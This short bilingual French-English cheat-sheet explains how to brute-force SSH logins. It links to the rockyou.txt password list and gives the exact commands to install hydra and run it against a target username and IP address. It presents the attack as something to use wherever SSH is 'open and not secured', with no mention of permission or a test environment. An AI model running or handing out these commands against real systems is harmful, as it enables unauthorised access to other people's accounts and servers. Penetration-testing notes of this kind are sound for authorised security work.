# Français

# Force brut

Si le port SSH est ouvert et non sécurisé, on peut utilisé hydrack

> **hydra** : Hydra est un cracker de connexion parallélisé qui prend en charge de nombreux protocoles d'attaque. Il est très rapide et flexible.

Installer ce fichier:
https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwj3tdONj4v-AhU-V6QEHTy5CaEQFnoECBgQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd

Ce fichier ce nomme rockyou.txt, il est assée volumineux car ce qu'il y à dedans représente plein de mot de passe couramment utiliser

## commande:

```shell
sudo apt update
sudo apt install hydra
sudo hydra -l nom_utilisateur -P rockyou.txt ssh://addresse_ip
```

# English

# Raw force

If the SSH port is open and not secured, you can use hydrack

> **hydra**: Hydra is a parallelized connection cracker that supports many attack protocols. It is very fast and flexible.

Install this file:
https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwj3tdONj4v-AhU-V6QEHTy5CaEQFnoECBgQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd

This file is called rockyou.txt, it's quite big because what's in it is a lot of commonly used passwords

## command:

```shell
sudo apt update
sudo apt install hydra
sudo hydra -l username -P rockyou.txt ssh://ipaddress
```